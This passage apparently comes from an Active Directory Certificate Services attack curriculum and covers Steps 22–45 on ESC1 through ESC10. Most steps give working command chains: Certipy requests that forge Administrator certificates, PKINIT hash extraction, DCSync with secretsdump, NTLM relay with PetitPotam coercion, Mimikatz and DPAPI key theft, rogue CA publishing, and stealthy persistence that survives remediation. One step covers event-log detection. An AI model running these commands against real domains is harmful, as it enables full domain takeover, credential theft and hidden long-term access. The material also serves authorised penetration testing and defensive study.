- Certipy detection: `[!] Vulnerabilities: ESC1`
- `msPKI-Cert-Template-OID` — template OID for requests
- The CA itself does NOT validate whether the UPN in SAN maps to the requester

---

### Step 22 — Execute ESC1 Weaponization

**Description:**
With an identified ESC1-vulnerable template, request a certificate specifying the Domain Administrator's UPN in the SAN field. This produces a `.pfx` file that represents — from the KDC's perspective — a valid Administrator certificate. The CA signs it without verifying that the requester IS the specified principal. The attack is completed in one Certipy command: `certipy req` with `-upn administrator@domain.local`.

**Key Concepts:**
- Certipy `req` command for certificate request
- `-upn` flag: specifies UPN to inject into SAN
- `-ca` flag: specifies target CA name
- `-template` flag: specifies vulnerable template name
- Output: `administrator.pfx` — signed by domain CA, claims to be Administrator
- PFX password: Certipy sets a random password, stored in output
- The CA validates: chain OK + template conditions met + enrollment rights = issues cert
- The CA does NOT validate: does the requester own the UPN they specified?
- This is the core logical flaw enabling ESC1

**Key Commands:**
```bash
# Request ESC1 certificate (Certipy)
certipy req -u 'lowpriv@domain.local' -p 'password' -ca 'CORP-CA' -template 'ESC1-Template' -upn 'administrator@domain.local' -dc-ip 10.10.10.10
# Output: administrator.pfx

# Request ESC1 certificate (Certify + Rubeus on Windows)
Certify.exe request /ca:"CA-Server\CORP-CA" /template:"ESC1-Template" /altname:"administrator"
# Output: cert.pem → convert to PFX → use Rubeus
```

---

### Step 23 — Extract TGT & NTLM Hash via PKINIT

**Description:**
With the Administrator's certificate (`.pfx`), authenticate to the KDC via PKINIT to obtain a Kerberos TGT as Administrator. Certipy's `auth` command automates this and also uses the U2U technique to extract the Administrator's NTLM hash from the TGT's PAC structure. With the NTLM hash, you can perform Pass-the-Hash to any service in the domain without needing the cleartext password, and pivot to a full DCSync.

**Key Concepts:**
- PKINIT authentication using client certificate
- Certipy `auth` command: performs PKINIT + NTLM extraction
- Rubeus `asktgt /certificate`: performs PKINIT, produces `.kirbi` TGT
- NTLM hash extraction from TGT PAC (User-to-User technique)
- Pass-the-Hash (PtH) using extracted NTLM hash
- Pass-the-Ticket (PtT) using Kerberos TGT
- DCSync using NTLM hash: `secretsdump.py` or Mimikatz `lsadump::dcsync`
- `krbtgt` hash extraction via DCSync → Golden Ticket
- Clock skew requirement: attacker clock must be within 5 minutes of KDC

**Key Commands:**
```bash
# Authenticate and extract NTLM hash (Certipy)
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -username administrator -domain domain.local
# Output: administrator NTLM hash

# Pass-the-Hash to perform DCSync
impacket-secretsdump -hashes ':NTLMhash' 'domain.local/administrator@10.10.10.10'

# Rubeus PKINIT + PTT
Rubeus.exe asktgt /certificate:base64pfx /password:pfxpass /domain:domain.local /dc:10.10.10.10 /ptt
# Then use any Kerberos-aware tool with current user's TGT injected
```

---

### Step 24 — Deconstruct ESC2 (Any Purpose / No EKU)

**Description:**
ESC2 occurs when a template specifies the "Any Purpose" EKU (`2.5.29.37.0`) or has a completely empty EKU list. Either condition means the issued certificate can be used for ANY purpose — including client authentication (PKINIT), code signing, server authentication, etc. The enrollment conditions (enrollment rights to low-privileged users, no manager approval) are the same as ESC1. Unlike ESC1, the enrollee does NOT need to supply a SAN — but if they can, it becomes a direct ESC1. If not, the cert can be used as an Enrollment Agent certificate (same as ESC3).

**Key Concepts:**
- Any Purpose EKU OID: `2.5.29.37.0`
- Empty EKU list = no restrictions = equivalent to Any Purpose
- Difference from ESC1: ESC2 doesn't require `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`
- ESC2 cert can be used for enrollment agent (leading to ESC3-style attack)
- ESC2 cert with enrollee-supplied subject → effectively ESC1
- Certipy detection: `[!] Vulnerabilities: ESC2`
- EKU check in PKINIT: KDC accepts Any Purpose as valid for authentication

---

### Step 25 — Deconstruct ESC3 (Certificate Request Agent)

**Description:**
ESC3 exploits the Enrollment Agent EKU (`1.3.6.1.4.1.311.20.2.1`). A certificate with this EKU allows the holder to submit certificate requests ON BEHALF OF other AD principals — essentially impersonating any user in the domain during the enrollment process. This is a legitimate feature for smart card deployment, but becomes an attack primitive when an unprivileged user can obtain an Enrollment Agent certificate. The attack is a two-stage process (see Step 26).

**Key Concepts:**
- Enrollment Agent EKU OID: `1.3.6.1.4.1.311.20.2.1`
- `CT_FLAG_IS_CA` vs. enrollment agent distinction
- `msPKI-RA-Signature` = 0: no additional signature required
- Template 1: grants Enrollment Agent cert to low-priv user (ESC3 template 1)
- Template 2: a second template that requires Enrollment Agent signature but allows enrollment for other users (ESC3 template 2)
- CA-level Enrollment Agent restrictions: `certsrv.msc` → CA properties → Enrollment Agents
- Restricted vs. unrestricted enrollment agent configuration
- Certipy detection: `[!] Vulnerabilities: ESC3`

---

### Step 26 — Execute the Two-Stage ESC3 Attack

**Description:**
Stage 1: Request an Enrollment Agent certificate from a template with the Certificate Request Agent EKU. Stage 2: Use that Enrollment Agent certificate to co-sign a certificate request for a second template on behalf of `administrator@domain.local`. The second template must have an authentication EKU and allow enrollment agent signatures. The CA issues a certificate bearing the Administrator's identity, which can then be used for PKINIT exactly like ESC1.

**Key Concepts:**
- Stage 1: `certipy req` against ESC3 template → gets Enrollment Agent `.pfx`
- Stage 2: `certipy req -on-behalf-of 'domain\administrator' -pfx agent.pfx` → gets Admin cert
- `-on-behalf-of` flag in Certipy specifies the impersonated principal
- Second template must accept enrollment agent signatures (`msPKI-RA-Signature` > 0)
- Second template must have authentication EKU
- CA validates Enrollment Agent cert chain and signature before issuing on-behalf-of cert
- Final step: use Admin cert with `certipy auth` — same as ESC1 endgame

**Key Commands:**
```bash
# Stage 1: get Enrollment Agent cert
certipy req -u 'user@domain.local' -p 'password' -ca 'CORP-CA' -template 'ESC3-Template1' -dc-ip 10.10.10.10
# Output: user.pfx (Enrollment Agent cert)

# Stage 2: request Admin cert on-behalf-of
certipy req -u 'user@domain.local' -p 'password' -ca 'CORP-CA' -template 'User' -on-behalf-of 'domain\administrator' -pfx user.pfx -dc-ip 10.10.10.10
# Output: administrator.pfx

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

---

### Step 27 — Analyze ESC4 (Template Access Control Abuse)

**Description:**
ESC4 occurs when a low-privileged principal has write permissions over a certificate template's AD object — specifically ACEs granting `WriteDacl`, `WriteOwner`, `WriteProperty` (full), or `GenericWrite`. These permissions allow the attacker to modify the template's attributes (EKUs, name flags, enrollment rights) to turn a safe template into an ESC1-vulnerable one, then exploit it, then optionally restore the original configuration. The key insight: template objects are just LDAP objects with ACLs, and AD ACL misconfigurations extend naturally into the PKI attack surface.

**Key Concepts:**
- AD ACE types relevant to ESC4: `WriteDacl`, `WriteOwner`, `GenericWrite`, `WriteProperty`
- `GenericAll` — full control over template object
- `WriteProperty` on specific attributes vs. all attributes
- `WriteDacl` — can grant yourself full control
- `WriteOwner` — can take ownership, then grant yourself full control
- Certipy detection: `[!] Vulnerabilities: ESC4`
- Target: modify `msPKI-Certificate-Name-Flag` to add `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`
- Target: modify `pKIExtendedKeyUsage` to add Client Authentication OID
- Target: modify `nTSecurityDescriptor` to add enrollment rights for attacker
- ACL abusing groups: Domain Users with GenericWrite on template object

---

### Step 28 — Perform Template Modification & Rollback

**Description:**
ESC4 exploitation involves three phases: (1) Modify the template using Certipy's `template` command to enable ESC1 conditions; (2) Exploit it using `certipy req` with UPN injection; (3) Restore the original template configuration to minimize detection footprint. Certipy's `template -save-old` flag saves the original attributes before modification, and `-configuration original.json` restores them after exploitation. This clean-up step is operationally important for stealth engagements.

**Key Concepts:**
- Certipy `template` subcommand
- `-save-old` flag: saves current template attributes as JSON before modification
- `-configuration` flag: applies a saved JSON configuration to restore a template
- What gets modified: `msPKI-Certificate-Name-Flag`, `pKIExtendedKeyUsage`, ACL
- Timeline window: template must be modified, cert requested, template restored — in sequence
- LDAP write permissions required for modification (the ESC4 ACL misconfiguration)
- Event log artifacts: LDAP write operations on template objects (Event 5136 on DC)
- Operational tempo: modify → wait for AD replication → request cert → restore

**Key Commands:**
```bash
# Modify template to become ESC1 (and save original)
certipy template -u 'user@domain.local' -p 'password' -template 'ESC4-Template' -save-old -dc-ip 10.10.10.10
# Now exploit as ESC1
certipy req -u 'user@domain.local' -p 'password' -ca 'CORP-CA' -template 'ESC4-Template' -upn 'administrator@domain.local' -dc-ip 10.10.10.10
# Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
# Restore original template
certipy template -u 'user@domain.local' -p 'password' -template 'ESC4-Template' -configuration ESC4-Template.json -dc-ip 10.10.10.10
```

---

### Step 29 — Target Cross-Domain Templates

**Description:**
In a multi-domain AD forest, certificate templates are replicated forest-wide in the Configuration NC. A template published by the root domain CA may have enrollment rights granted to `Authenticated Users` — which includes users from all child domains. A compromised user in a child domain can therefore enroll in a root domain template, inject the root domain `Administrator@corp.local` UPN into the SAN, and obtain a certificate to authenticate as the root domain Administrator. This is a cross-domain privilege escalation path that bypasses domain trust boundaries.

**Key Concepts:**
- Configuration NC replication: forest-wide, includes all template objects
- `Authenticated Users` enrollment right includes all forest users
- Cross-domain PKINIT: child domain user authenticates to root domain KDC
- `NTAuthCertificates` is also forest-wide — root domain CA is trusted everywhere
- Certipy `-dc-ip` should target root domain DC for cross-domain auth
- Multi-forest vs. single-forest trust implications
- Selective Authentication on forest trusts can restrict cross-forest enrollment
- Targeting: `administrator@rootdomain.local` UPN in SAN from child domain user

**Key Commands:**
```bash
# From child domain user, target root domain CA
certipy req -u 'childuser@child.corp.local' -p 'password' -ca 'CORP-CA' -template 'VulnerableTemplate' -upn 'administrator@corp.local' -dc-ip 10.10.10.1
# Authenticate against root DC
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -username administrator -domain corp.local
```

---

### Step 30 — Review Event Logs for ESC1–ESC4

**Description:**
Understanding the defensive footprint of ESC1–ESC4 exploitation is essential for both red team reporting and blue team detection engineering. Key Windows Security Event IDs: **4886** — "Certificate Services received a certificate request"; **4887** — "Certificate Services approved a certificate request and issued a certificate" (includes requester name, template, and issued cert serial); **4888** — "Certificate Services denied a certificate request". On DCs: **4768** — Kerberos TGT request (PKINIT requests have `Certificate` pre-auth type). **5136** — directory service object modification (template modification in ESC4).

**Key Concepts:**
- Event ID 4886: certificate request received (on CA server)
- Event ID 4887: certificate issued — includes `Requester`, `Template`, `Serial Number`, `Subject`
- Event ID 4888: certificate denied
- Event ID 4768: Kerberos TGT request — `Pre-Auth Type: 16` indicates PKINIT
- Event ID 5136: AD object attribute modification (ESC4 template changes, logged on DC)
- Windows Event Log provider: `Microsoft-Windows-Security-Auditing`
- CA-side audit policy: `certsrv.msc` → CA properties → Auditing tab
- Suspicious indicators: low-priv user requesting cert with Domain Admin UPN in SAN
- SIEM correlation: 4887 (admin cert issued to non-admin) → 4768 PKINIT → 4624 logon
- Sigma rules for AD CS abuse detection

---

## Phase 4 — Architecture, Access Control & Relay Attacks ESC5–ESC8 (Steps 31–40)

> **Goal:** Expand your attack surface to CA-level permissions, PKI container ACLs, and network-based NTLM relay attacks against AD CS web interfaces.

---

### Step 31 — Analyze ESC5 (PKI Object ACL Abuse)

**Description:**
ESC5 is a broad category covering ACL misconfigurations on the AD objects that constitute the PKI infrastructure itself — not just templates. Critical objects to audit: the CA computer object in AD (write access allows adding rogue certificates to the machine's store), the `CN=Public Key Services` container (write access enables adding objects), `CN=Certificate Templates` container (write allows creating new template objects), `CN=Certification Authorities` container, and `CN=NTAuthCertificates` object (write access here allows adding a rogue CA certificate, enabling forged certificates to be trusted for PKINIT). ESC5 is the most architecturally impactful variant.

**Key Concepts:**
- `CN=Public Key Services,CN=Services,CN=Configuration` ACL
- `CN=NTAuthCertificates` write access — allows adding rogue CA certs (leads to PKINIT bypass)
- `CN=Certificate Templates` container write — allows creating new template objects
- `CN=Certification Authorities` write — allows adding/modifying root CA objects
- CA computer object `WriteDacl`/`GenericWrite` — allows local admin path to CA
- `certutil -dspublish` — publishes certificates to NTAuthCertificates
- `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration` — registry-based CA config
- Certipy: `certipy find` reports ACLs on these containers
- BloodHound ESC5 detection: edges on PKI container objects

**Key Commands:**
```bash
# Check NTAuthCertificates ACL
(Get-Acl "AD:CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local").Access
# Add rogue cert to NTAuthCertificates (if you have write)
certutil -dspublish -f rogue-ca.crt NTAuthCA
```

---

### Step 32 — Deconstruct ESC6 (CA Configuration Flag Abuse)

**Description:**
ESC6 exploits the CA-level flag `EDITF_ATTRIBUTESUBJECTALTNAME2`. When this flag is enabled on the CA server (not on any template), the CA will honor the `SAN` attribute in ANY certificate request, regardless of what the template specifies. This means even templates that do NOT have `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` set can be abused to inject arbitrary UPNs. Any template with an authentication EKU that allows low-priv enrollment becomes an ESC1-equivalent attack path when the CA has this flag. This flag is sometimes enabled by administrators for legacy compatibility reasons.

**Key Concepts:**
- `EDITF_ATTRIBUTESUBJECTALTNAME2` — CA-level registry flag
- Location: `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy`
- Flag value: `0x00040000` within the `EditFlags` DWORD
- `certutil -getreg CA\EditFlags` — check current value
- Effect: CA honors `san:upn=user@domain.local` attribute in ANY request
- Certipy detection: `User Specified SAN: Enabled` in CA properties output
- ESC6 was largely patched by Microsoft KB5014754 (May 2022) in enforcement mode
- Pre-patch: supply SAN via `certreq` attribute section
- Post-patch: enforcement mode rejects SAN in non-SAN-enabled templates

**Key Commands:**
```bash
# Check ESC6 flag on CA
certutil -getreg CA\EditFlags
# Value includes 0x00040000 = ESC6 enabled

# Exploit ESC6 (request any auth-EKU template with SAN injection)
certipy req -u 'user@domain.local' -p 'password' -ca 'CORP-CA' -template 'User' -upn 'administrator@domain.local' -dc-ip 10.10.10.10
```

---

### Step 33 — Analyze ESC7 (CA Officer/Administrator Privileges)

**Description:**
ESC7 covers scenarios where a low/medium-privileged account holds `ManageCA` or `ManageCertificates` rights on the CA server. `ManageCA` allows modifying CA configuration, including enabling the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (converting ESC7 into ESC6). `ManageCertificates` (CA Officer role) allows approving pending certificate requests — enabling an attacker to submit a request for an Administrator certificate to a template that requires manager approval, then self-approve it using their Officer rights.

**Key Concepts:**
- `ManageCA` right: CA Administrator role — full CA configuration control
- `ManageCertificates` right: CA Officer role — can approve/deny pending requests
- CA security descriptor: `certsrv.msc` → CA properties → Security tab
- `ManageCA` abuse: enable `EDITF_ATTRIBUTESUBJECTALTNAME2` flag → ESC6 condition
- `ManageCertificates` abuse: submit malicious request → approve own request
- Certipy detection: lists principals with ManageCA/ManageCertificates
- `certutil -setcaproperty` and `certutil -resubmit` for CA management
- `certipy ca` subcommand for CA-level operations

**Key Commands:**
```bash
# Check CA rights (Certipy)
certipy find -u 'user@domain.local' -p 'password' -dc-ip 10.10.10.10
# Enable ESC6 flag via ManageCA (Certipy)
certipy ca -u 'officer@domain.local' -p 'password' -ca 'CORP-CA' -enable-userspecifiedsan -dc-ip 10.10.10.10
```

---

### Step 34 — Execute Pending Certificate Release (ESC7)

**Description:**
With `ManageCertificates` rights, execute the full ESC7 attack chain: (1) Submit a certificate request for a template that has an authentication EKU and manager approval required — this produces a "pending" request; (2) Use CA Officer rights to approve your own request; (3) Retrieve the issued certificate; (4) Use it for PKINIT. This bypasses the manager approval control that would otherwise block ESC1 exploitation. Certipy automates the submission and retrieval, but the approval step requires the `certipy ca -issue-request` command.

**Key Concepts:**
- Manager approval (`CT_FLAG_PEND_ALL_REQUESTS`) creates pending requests
- Pending request ID: used to approve and retrieve the issued cert
- `certipy ca -issue-request <id>`: approves a pending request (requires ManageCertificates)
- `certipy req -retrieve <id>`: retrieves an issued certificate by request ID
- Request lifecycle: Pending → Issued → Retrieved
- `certutil -resubmit <requestID>` — Windows-native approval
- `certutil -retrieve <requestID> cert.pem` — Windows-native retrieval
- The approval and the request can come from different accounts (attacker uses Officer account to approve request made by low-priv account)

**Key Commands:**
```bash
# 1. Submit request (will be pending)
certipy req -u 'user@domain.local' -p 'password' -ca 'CORP-CA' -template 'ApprovalTemplate' -upn 'administrator@domain.local' -dc-ip 10.10.10.10
# Note the request ID in output

# 2. Approve pending request (with Officer account)
certipy ca -u 'officer@domain.local' -p 'password' -ca 'CORP-CA' -issue-request 42 -dc-ip 10.10.10.10

# 3. Retrieve issued certificate
certipy req -u 'user@domain.local' -p 'password' -ca 'CORP-CA' -retrieve 42 -dc-ip 10.10.10.10
```

---

### Step 35 — Deconstruct ESC8 (NTLM Relay to Web Enrollment)

**Description:**
ESC8 is a network-based attack that relays NTLM authentication from a privileged machine to the AD CS Web Enrollment interface (`/certsrv/certfnsh.asp`). When a Domain Controller (or other privileged machine) can be coerced to authenticate outbound via NTLM, and the CA's Web Enrollment service accepts NTLM over HTTP (not HTTPS), the attacker can relay that authentication to obtain a certificate bearing the DC's machine identity. A DC machine certificate enables PKINIT as the DC, followed by a DCSync via S4U2Self.

**Key Concepts:**
- NTLM relay attack fundamentals (NTLM challenge-response interception)
- `ntlmrelayx.py` from Impacket — relay framework
- AD CS Web Enrollment endpoint: `http://ca-server/certsrv/certfnsh.asp`
- NTLM over HTTP (no channel binding, no signing requirement) — relay succeeds
- NTLM over HTTPS with EPA (Extended Protection for Authentication) — relay fails
- Coercion techniques: PetitPotam (MS-EFSR), PrinterBug (MS-RPRN), DFSCoerce (MS-DFSNM)
- Why coerce a DC: DC machine cert → PKINIT as DC → S4U2Self → DCSync
- `--adcs` flag in ntlmrelayx: auto-requests certificate from relayed session
- `--template` flag: specify which template to request in the relay

---

### Step 36 — Execute ESC8 via Coerced Authentication

**Description:**
Full ESC8 execution: (1) Start `ntlmrelayx` with `--adcs` flag targeting the CA's Web Enrollment URL; (2) Use PetitPotam or PrinterBug to coerce the target Domain Controller to authenticate outbound to your listener IP; (3) ntlmrelayx receives the DC's NTLM authentication and relays it to `/certsrv/certfnsh.asp`; (4) The CA issues a machine certificate for the DC, which ntlmrelayx saves; (5) Use the DC machine certificate for PKINIT.

**Key Concepts:**
- `ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp --adcs` — setup relay
- PetitPotam: `python3 PetitPotam.py <attacker-ip> <dc-ip>` — MS-EFSR coercion
- PrinterBug: `python3 printerbug.py domain/user:pass@dc-ip attacker-ip`
- DFSCoerce: alternative coercion via MS-DFSNM
- ntlmrelayx output: Base64-encoded certificate for the coerced machine
- Decode and convert: Base64 → PFX for use with Certipy auth
- Machine account certificate → PKINIT → TGT for `DC$` account
- `DC$` TGT → Secretsdump (DCSync) → all domain hashes
- Prerequisites: Web Enrollment on HTTP (not HTTPS+EPA)

**Key Commands:**
```bash
# 1. Start ntlmrelayx targeting Web Enrollment
impacket-ntlmrelayx -t http://10.10.10.20/certsrv/certfnsh.asp --adcs --template 'DomainController' -smb2support

# 2. Coerce DC authentication (PetitPotam)
python3 PetitPotam.py 10.10.10.99 10.10.10.5
# (attacker-ip, dc-ip)

# 3. ntlmrelayx prints Base64 cert — save it
echo "<base64>" | base64 -d > dc.pfx

# 4. PKINIT as DC machine account
certipy auth -pfx dc.pfx -dc-ip 10.10.10.10 -username 'DC$' -domain domain.local

# 5. DCSync
impacket-secretsdump -hashes ':NTLMhash' 'domain.local/DC$@10.10.10.10'
```

---

### Step 37 — Perform Pass-the-Certificate & DCSync

**Description:**
"Pass-the-Certificate" is the technique of using a stolen or relayed certificate to authenticate via PKINIT, analogous to Pass-the-Hash with NTLM hashes. With a Domain Controller machine certificate (from ESC8), perform PKINIT to obtain a TGT for the DC machine account (`DC$`). Then use Impacket's `secretsdump` with the DC's NTLM hash to perform a DCSync — pulling all password hashes from the domain, including `krbtgt`, all Domain Admins, and all domain users. This is full domain compromise.

**Key Concepts:**
- Pass-the-Certificate (PtC) — PKINIT using a stolen `.pfx`
- Machine account TGT: `DC$@domain.local`
- S4U2Self: using DC$ TGT to impersonate any user (alternative to DCSync)
- DCSync: simulates DC replication to pull all credential hashes
- `impacket-secretsdump -just-dc` — targeted DCSync for specific accounts
- `krbtgt` hash → Golden Ticket → infinite persistence
- Domain Admin NTLM hashes → immediate lateral movement
- DPAPI domain backup key (also in DCSync output)
- `Rubeus.exe s4u /impersonateuser:administrator` — S4U2Self for TGS

**Key Commands:**
```bash
# PKINIT with DC cert
certipy auth -pfx dc.pfx -username 'DC$' -domain domain.local -dc-ip 10.10.10.10
# Output: DC$ NTLM hash

# DCSync all hashes
impacket-secretsdump -hashes ':DC_NTLM_hash' -just-dc 'domain.local/DC$@10.10.10.10'
# DCSync single account
impacket-secretsdump -hashes ':DC_NTLM_hash' -just-dc-user 'krbtgt' 'domain.local/DC$@10.10.10.10'
```

---

### Step 38 — Examine ESC9 & ESC10 (Strong Certificate Mapping)

**Description:**
ESC9 and ESC10 relate to Microsoft's May 2022 patch (KB5014754) that introduced "strong certificate mapping" to harden PKINIT. ESC9 occurs when `StrongCertificateBindingEnforcement` is set to `0` (disabled) or `1` (compatibility mode) — allowing certificates without the new `szOID_NTDS_CA_SECURITY_EXT` extension to still be used for authentication. ESC10 covers scenarios where `CertificateMappingMethods` registry values allow weak mapping. ESC9/10 are relevant in environments that haven't fully enforced the patch (enforcement mode = 2).

**Key Concepts:**
- KB5014754 (May 2022 patch) — introduced strong certificate mapping
- `StrongCertificateBindingEnforcement` registry key on DC: 0=disabled, 1=compat, 2=full enforcement
- `HKLM\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement`
- New OID `szOID_NTDS_CA_SECURITY_EXT` (1.3.6.1.4.1.311.25.2) — binds cert to AD SID
- Compatibility mode: if SID extension missing, KDC falls back to UPN mapping (still vulnerable)
- Full enforcement: certificates without SID extension rejected for PKINIT
- `CertificateMappingMethods` on CA: controls which mapping methods are allowed
- ESC9: `CT_FLAG_NO_SECURITY_EXTENSION` on template — cert issued without SID extension
- ESC10: `CertificateMappingMethods` includes weak methods like subject/issuer mapping

**Key Commands:**
```bash
# Check enforcement mode on DC
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement
# Check CertificateMappingMethods on CA
certutil -getreg CA\CertificateMappingMethods
```

---

### Step 39 — Exploit Certificate Renewal Policies

**Description:**
Certificate renewal is a process by which an expiring certificate can be renewed — extending its validity — without going through a full new enrollment. Renewal abuse occurs when: (1) an attacker holds a valid certificate for a low-privileged user; (2) the renewal policy allows modifying the SAN or Subject during renewal; (3) the renewed certificate is issued with elevated EKUs or a modified UPN. Additionally, if a template allows renewal of certificates using the existing certificate as proof-of-identity (rather than password/Kerberos), a compromised certificate provides indefinite renewal capability even after a password reset.

**Key Concepts:**
- Certificate renewal via existing certificate (not password)
- `msPKI-Enrollment-Flag`: `CT_FLAG_PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT`
- Renewal-based persistence: certificate proves identity for re-enrollment
- Password reset does NOT revoke existing certificates (offline persistence)
- `CT_FLAG_REENROLLMENT_REQUIRES_CURRENT_CERTIFICATE` — renewal needs current cert
- Renewal with SAN modification: possible if template allows it
- `certreq -renew` — Windows renewal command
- Long-term persistence strategy: chain renewals to maintain access indefinitely

---

### Step 40 — Establish External Persistence

**Description:**
Certificates provide a uniquely stealthy persistence mechanism: they survive password resets, are often not monitored, and can be used to authenticate to services that don't require AD Kerberos (VPNs, ADFS, client certificate-enabled web apps). Post-exploitation, register the compromised certificate for VPN authentication (if the VPN trusts the domain CA), use it with ADFS for federated application access, or embed it in web requests for client certificate authenticated internal services. Certificates with 10-year validity provide multi-year persistence if the CA is not revoked.

**Key Concepts:**
- Certificate-based VPN authentication (RADIUS + EAP-TLS)
- Active Directory Federation Services (ADFS) — certificate-based SSO
- Azure AD certificate-based authentication (hybrid environments)
- Client certificate authentication on IIS / nginx / Apache
- Certificate persistence advantage: survives password changes
- Certificate persistence disadvantage: can be revoked (if CA admin detects abuse)
- `NTAuthCertificates` modification persistence: rogue CA for infinite valid certs
- Conditional Access in Azure AD: can restrict certificate-based auth
- Monitoring gap: most SIEMs don't alert on certificate-based auth events as anomalies

---

## Phase 5 — Advanced Engineering, Tool Crafting & Defense (Steps 41–50)

> **Goal:** Transition from automated tools to understanding low-level mechanics, building custom logic, and implementing enterprise-grade defenses.

---

### Step 41 — Extract Certificates from Memory

**Description:**
Post-exploitation certificate extraction from memory provides access to certificates and private keys that exist in running processes without touching disk. The LSASS process caches certificate material for users with active sessions. Mimikatz's `crypto::certificates` command enumerates and exports certificates from the Windows certificate stores (MY, CA, ROOT, NTAUTH). The `/export` flag extracts private keys directly. Additionally, certificates loaded for active HTTPS/TLS connections may exist in process memory of web servers and other services.

**Key Concepts:**
- `mimikatz crypto::certificates` — enumerates certificate stores
- `/systemstore:LOCAL_MACHINE` vs. `/systemstore:CURRENT_USER`
- `/export` flag — exports certificates and private keys to disk
- LSASS memory — holds session keys and certificate material
- Windows certificate stores: MY (personal), CA, ROOT, NTAUTH
- CNG (Cryptography API: Next Generation) key storage
- DPAPI protection of private keys on disk (see Step 42)
- `certutil -store My` — enumerate personal certificate store
- Remote certificate extraction via WMI or PSRemoting
- SharpDPAPI — C# DPAPI and certificate extraction tool

**Key Commands:**
```
# Mimikatz commands
privilege::debug
crypto::certificates /systemstore:LOCAL_MACHINE /store:My /export
crypto::certificates /systemstore:CURRENT_USER /export
# SharpDPAPI
SharpDPAPI.exe certificates /machine
```

---

### Step 42 — Decrypt Certificates via DPAPI

**Description:**
Windows protects private keys on disk using the Data Protection API (DPAPI). Private key files are stored in `%APPDATA%\Microsoft\Crypto\RSA\<SID>\` (user keys) or `%ProgramData%\Microsoft\Crypto\RSA\MachineKeys\` (machine keys). They are encrypted using a DPAPI Master Key, which is itself derived from the user's password (user keys) or the DPAPI machine secret (machine keys). Extracting and decrypting these keys without Mimikatz (which requires LSASS access) requires: extracting the Master Key blob, obtaining the DPAPI secret (user password or machine backup key), and decrypting offline.

**Key Concepts:**
- DPAPI (Data Protection API) — transparent encryption for application secrets
- User DPAPI Master Key location: `%APPDATA%\Microsoft\Protect\<SID>\`
- Machine DPAPI Master Key location: `%ProgramData%\Microsoft\Protect\`
- DPAPI backup key: domain-wide secret stored on DC, recoverable via DCSync
- `mimikatz lsadump::backupkeys` — extract domain DPAPI backup key
- `SharpDPAPI certificates` — automated DPAPI cert decryption
- `impacket-dpapi` — Linux-based DPAPI decryption
- Private key blob → decrypt with master key → PEM private key
- `openssl pkcs12 -export` to bundle decrypted key with cert into PFX
- Machine key DPAPI: protected by LSA secret (extractable via `lsadump::secrets`)

**Key Commands:**
```bash
# Extract DPAPI backup key (requires DA)
mimikatz lsadump::backupkeys /system:10.10.10.10 /export
# Decrypt user certs with backup key
SharpDPAPI.exe certificates /pvk:backup.pvk
# Linux offline decryption
impacket-dpapi masterkey -file masterkey.blob -sid S-1-5-21-... -password 'userpass'
impacket-dpapi credential -file cert.blob -masterkey <hex-mk>
```

---

### Step 43 — Design Certificate-Based Persistence

**Description:**
After achieving domain compromise, establish long-lived certificate persistence to survive password resets, account lockouts, and remediation attempts. Tactics: (1) Issue certificates with 10+ year validity from a compromised CA; (2) Enroll in obscure, rarely-audited templates; (3) Enroll certificates for service accounts and machine accounts (less scrutinized than user accounts); (4) If ESC5 (NTAuthCertificates write) is possible, install a rogue CA certificate — now any certificate signed by your rogue CA is trusted for PKINIT; (5) Use Shadow Credentials (`msDS-KeyCredentialLink`) as a certificate-equivalent persistence mechanism.

**Key Concepts:**
- Certificate validity period: set at template level (`pKIDefaultKeySpec`)
- `pKIDefaultKeySpec` and `pKIMaxIssuingDepth`
- Enrolling machine account certificates for persistence
- Shadow Credentials: `msDS-KeyCredentialLink` attribute manipulation
- Whisker / pyWhisker — Shadow Credentials tools
- Rogue CA installation via `certutil -dspublish -f rogue.crt NTAuthCA`
- Rogue CA-issued certificates trusted for PKINIT domain-wide
- Avoid: templates with short validity, templates visible in routine audits
- Target: obscure templates, service account OUs, rarely-reviewed template names

---

### Step 44 — Architect Custom AD CS Decision Engines

**Description:**
Build an automated vulnerability analysis engine that operates on raw LDAP dumps or Certipy JSON output to calculate exploitable ESC chains without any external dependencies. The engine should: parse `msPKI-Certificate-Name-Flag` bit flags programmatically, evaluate EKU OID lists against a known-dangerous OID set, check enrollment rights ACLs against low-privileged group SIDs, correlate CA-level flags (`EDITF_ATTRIBUTESUBJECTALTNAME2`) with template conditions, and output prioritized findings with attack chain descriptions.

**Key Concepts:**
- `msPKI-Certificate-Name-Flag` bitmask parsing (Python `& 0x00000001`)
- `msPKI-Enrollment-Flag` bitmask: approval, SAN, enrollment type flags
- EKU OID set comparison against dangerous OID list
- ACL parsing: `nTSecurityDescriptor` binary → SDDL → ACE enumeration
- Well-known SIDs: Domain Users (S-1-5-21-...-513), Authenticated Users (S-1-5-11)
- CA attribute correlation: `User Specified SAN` flag with template EKUs
- ESC chain logic: ESC7→ESC6→ESC1 chain calculation
- JSON schema design for Certipy output consumption
- Python `ldap3` or `impacket` for raw LDAP queries
- Output format: CVSS-scored findings with remediation steps

---

### Step 45 — Deconstruct Bit-Level PKINIT Packets

**Description:**
Using Wireshark on your lab captures, analyze the exact ASN.1 binary structure of PKINIT `AS-REQ` and `AS-REP` packets. The `PA-PK-AS-REQ` pre-authentication data contains a CMS `SignedData` structure wrapping the `AuthPack`, which includes the client's certificate and a DH public key. The `AS-REP` contains the KDC's DH public value and the encrypted reply key. Understanding this at the packet level is essential for writing custom PKINIT clients, debugging exploitation edge cases, and building detection signatures.

**Key Concepts:**
- Kerberos AS-REQ structure (RFC 4556 for PKINIT extension)
